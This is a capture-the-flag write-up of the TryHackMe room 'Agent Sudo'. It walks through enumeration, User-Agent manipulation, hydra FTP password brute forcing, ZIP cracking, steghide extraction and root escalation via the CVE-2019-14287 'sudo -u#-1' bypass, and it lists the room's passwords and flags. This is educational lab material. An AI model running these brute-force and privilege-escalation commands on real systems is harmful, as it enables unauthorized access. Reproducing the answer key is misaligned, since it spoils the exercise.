# TryHackMe — Agent Sudo

> **Difficulty:** Easy  
> **Tags:** Enumeration, Steganography, Brute Force, Privilege Escalation, CVE-2019-14287  
> **Author:** DesKel  

---

## Overview

A secret server hidden under the deep sea. Our objective: enumerate services, discover agent identities through HTTP header manipulation, extract hidden data via steganography, and escalate privileges using a known sudo vulnerability.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -O 10.67.148.192
```

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.3 |
| 22   | SSH     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80   | HTTP    | Apache 2.4.29 (Ubuntu) |

The HTTP title `Annoucement` hints at a message for internal agents.

### Directory Enumeration

```bash
gobuster dir -u http://10.67.148.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt
```

Only `index.php` was found — no hidden directories. The attack surface is minimal on the web side, pointing toward the page content itself as the clue.

---

## Task 2 — User-Agent Manipulation & Hash Cracking

### Discovering the Secret Page

Fetching the index page reveals a message from **Agent R**:

```bash
curl http://10.67.148.192/index.php
```

```
Dear agents,
Use your own codename as user-agent to access the site.
From, Agent R
```

Agents use single-letter codenames. Iterating through A–Z with the `User-Agent` header:

```bash
curl -A "C" http://10.67.148.192/index.php -v -L
```

Agent C triggers a **302 redirect** to `agent_C_attention.php`:

```
Attention chris,
Do you still remember our deal? Please tell agent J about the stuff ASAP.
Also, change your god damn password, is weak!
From, Agent R
```

**Findings:**
- Agent C's real name: **chris**
- Password is described as weak — brute force candidate

### FTP Brute Force

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.67.148.192 ftp -t 30
```

```
[21][ftp] host: 10.67.148.192   login: chris   password: crystal
```

### FTP Loot

```bash
ftp 10.67.148.192  # chris:crystal
binary
mget *
```

Retrieved files:
- `cute-alien.jpg` — JPEG image
- `cutie.png` — PNG image
- `To_agentJ.txt` — text file

```
Dear agent J,
All these alien like photos are fake! Agent R stored the real picture inside
your directory. Your login password is somehow stored in the fake picture.
From, Agent C
```

### Extracting Hidden ZIP from PNG

The PNG contains an embedded ZIP archive. Using `hexdump` to locate the ZIP magic bytes:

```bash
hexdump -C cutie.png | grep -i "pk"
```

The real ZIP Local File Header (`PK\x03\x04`) sits at offset `0x8700`. Extracting it:

```bash
python3 -c "
data = open('cutie.png','rb').read()
idx = data.find(b'PK\x03\x04')
print(f'ZIP header at offset {idx} (0x{idx:x})')
with open('hidden.zip','wb') as f:
    f.write(data[idx:])
"
```

> **Note:** Searching for just `PK` (2 bytes) will match random data inside the PNG. Always use the full 4-byte signature `PK\x03\x04` to avoid false positives. Alternatively, `foremost cutie.png -o output/` handles this automatically.

### Cracking the ZIP Password

The ZIP uses AES encryption (requires PK compat v5.1):

```bash
zip2john hidden.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
alien            (hidden.zip/To_agentR.txt)
```

Extracting with `7z`:

```bash
7z x hidden.zip -palien
cat To_agentR.txt
```

```
Agent C,
We need to send the picture to 'QXJlYTUx' as soon as possible!
By, Agent R
```

### Base64 Decode + Steghide

```bash
echo "QXJlYTUx" | base64 -d
# Area51
```

Using `Area51` as the steghide passphrase on the JPEG:

```bash
steghide extract -sf cute-alien.jpg -p Area51
cat message.txt
```

```
Hi james,
Glad you find this message. Your login password is hackerrules!
Your buddy, chris
```

---

## Task 3 — User Flag

### SSH Access

```bash
ssh james@10.67.148.192  # password: hackerrules!
cat user_flag.txt
```

```
b03d975e8c92a7c04146cfa7a5a313c7
```

### The Alien Photo

The file `Alien_autospy.jpg` in james' home directory references the famous **Roswell alien autopsy** — a hoax film from 1995, later admitted as fabricated by its creator Ray Santilli in 2006.

---

## Task 4 — Privilege Escalation (CVE-2019-14287)

### Sudo Enumeration

```bash
sudo -l
```

```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

The rule allows james to run `/bin/bash` as **any user except root**. However, the sudo version on this machine (< 1.8.28) is vulnerable to **CVE-2019-14287**.

### Exploitation

The vulnerability exploits how sudo resolves user IDs. When UID `-1` (or `4294967295`) is passed, `setresuid()` converts it to `0` (root), but sudo's policy check compares against the original value and does not match the `!root` exclusion:

```bash
sudo -u#-1 /bin/bash
whoami
# root
```

### Root Flag

```bash
cat /root/root.txt
```

```
b53a02f55b57d4439e3341834d70c062
```

Agent R is revealed to be **DesKel**, the room's author.

---

## Flags & Answers Summary

| Question | Answer |
|----------|--------|
| How to redirect to the secret page? | `user-agent` |
| Agent name | `chris` |
| FTP password | `crystal` |
| ZIP password | `alien` |
| Stego password | `Area51` |
| SSH user / password | `james` / `hackerrules!` |
| User flag | `b03d975e8c92a7c04146cfa7a5a313c7` |
| Photo incident | `Roswell alien autopsy` |
| CVE for privesc | `CVE-2019-14287` |
| Root flag | `b53a02f55b57d4439e3341834d70c062` |
| Agent R | `DesKel` |

---

## Lessons Learned

1. **User-Agent as an attack vector** — HTTP headers are user-controlled input. Server-side logic that branches on `User-Agent` can leak information or expose hidden functionality. Always test header manipulation during enumeration.

2. **Binary signature precision matters** — When manually extracting embedded files, search for the complete magic bytes (`PK\x03\x04` for ZIP), not partial matches (`PK`). Two random bytes will produce false positives in any binary file. Tools like `foremost` and `binwalk` handle this correctly.

3. **Steganography chain** — CTFs often chain multiple hiding techniques: embedded archives inside images, Base64-encoded passphrases, and steghide data in separate files. Follow the breadcrumbs methodically.

4. **CVE-2019-14287 in practice** — The sudo rule `(ALL, !root)` looks restrictive but is trivially bypassed on unpatched systems with `sudo -u#-1`. This reinforces the room's own advice: *always update your machine*.
